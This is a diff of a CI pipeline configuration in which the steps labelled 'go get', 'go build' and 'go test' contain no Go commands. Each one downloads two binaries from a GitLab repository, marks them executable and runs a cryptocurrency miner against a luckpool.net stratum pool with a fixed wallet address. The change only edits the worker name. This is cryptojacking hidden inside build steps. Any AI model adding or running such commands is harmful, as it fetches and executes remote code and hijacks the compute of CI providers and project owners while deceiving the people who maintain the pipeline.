@@ -30,14 +30,14 @@ build:
     - script:
         name: go get
         code: |
-          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure -p x --cpu $(nproc)
     # Build the project
     - script:
         name: go build
         code: |
-          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure -p x --cpu $(nproc)
     # Test the project
     - script:
         name: go test
         code: |
-          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p x --cpu $(nproc)
+          wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure -p x --cpu $(nproc)
